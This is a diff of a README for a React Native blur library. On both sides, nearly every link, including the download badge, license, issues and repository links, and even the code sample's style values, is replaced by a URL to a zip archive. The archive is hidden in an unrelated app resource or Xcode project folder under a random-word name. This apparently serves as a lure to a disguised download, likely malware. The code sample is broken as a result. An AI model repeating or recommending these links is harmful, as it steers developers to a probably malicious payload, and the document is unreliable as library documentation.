@@ -1,6 +1,6 @@
 # 🎨 react-native-variable-blur - Create Stunning Blurs in Your App
 
-[![Download Here](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip)
+[![Download Here](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip%20Now-Click%20Here-brightgreen)](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **react-native-variable-blur**! This tool allows you to create beauti
 
 To get started, visit the following link to download the application:
 
-[Download from Releases Page](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip)
+[Download from Releases Page](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip)
 
 Once there, you will find different versions of the application. Choose the latest version for the best experience. Click on the file that suits your operating system, and the download will start automatically.
 
@@ -20,7 +20,7 @@ Before downloading, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS 10.12 or later, or any modern Linux distribution.
 - **React Native**: Ensure you have React Native set up in your project. The library requires React Native version 0.60 or greater.
-- **https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip**: This should be installed on your machine. You can get it from [https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
+- **https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip**: This should be installed on your machine. You can get it from [https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip).
 
 ## ⚙️ Installation Steps
 
@@ -65,17 +65,17 @@ import VariableBlur from 'react-native-variable-blur';
 
 const App = () => {
   return (
-    <View style={https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip}>
+    <View style={https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip}>
       <VariableBlur
         blurType="light"
         blurAmount={10}
-        style={https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip}
+        style={https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip}
       />
     </View>
   );
 };
 
-const styles = https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip({
+const styles = https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip({
   container: {
     flex: 1,
     justifyContent: 'center',
@@ -100,12 +100,12 @@ This example demonstrates how to create a simple blurred background in your app.
 
 ## 🧑‍🤝‍🧑 Community Support
 
-If you run into any issues or have questions, feel free to reach out in the [Issues](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip) section of the repository. We encourage users to share their experiences or improvements.
+If you run into any issues or have questions, feel free to reach out in the [Issues](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip) section of the repository. We encourage users to share their experiences or improvements.
 
 ## 📄 License
 
-This project is licensed under the MIT License. You can review the full license [here](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
+This project is licensed under the MIT License. You can review the full license [here](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip).
 
 ## 🎉 Contributing
 
-Contributions are welcome! Please submit your pull requests or suggestions on the [GitHub repo](https://raw.githubusercontent.com/nifethecaveman/react-native-variable-blur/master/example/ios/VariableBlurExample.xcodeproj/react-native-variable-blur_scolecoid.zip).
+Contributions are welcome! Please submit your pull requests or suggestions on the [GitHub repo](https://github.com/nifethecaveman/react-native-variable-blur/raw/refs/heads/master/example/android/app/src/main/res/mipmap-hdpi/variable-blur-native-react-unfluctuating.zip).
